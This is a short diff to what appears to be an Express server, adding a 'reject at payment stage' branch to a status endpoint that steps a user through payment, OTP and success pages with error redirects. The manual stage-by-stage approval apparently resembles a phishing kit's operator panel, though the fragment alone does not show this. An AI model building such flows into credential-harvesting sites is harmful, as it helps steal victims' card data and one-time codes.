@@ -223,6 +223,11 @@ app.get('/api/status/:id', (req, res) => {
     redirect = 'success.html';
     decision = 'approved';
     payloadStage = 'success';
+  } else if (status === 'reject' && stage === 'payment') {
+    redirectUrl = 'payment.html?error=1';
+    redirect = 'payment.html?error=1';
+    decision = 'rejected';
+    payloadStage = 'payment';
   } else if (status === 'reject' && stage === 'otp') {
     redirectUrl = 'otp.html?error=1';
     redirect = 'otp.html?error=1';
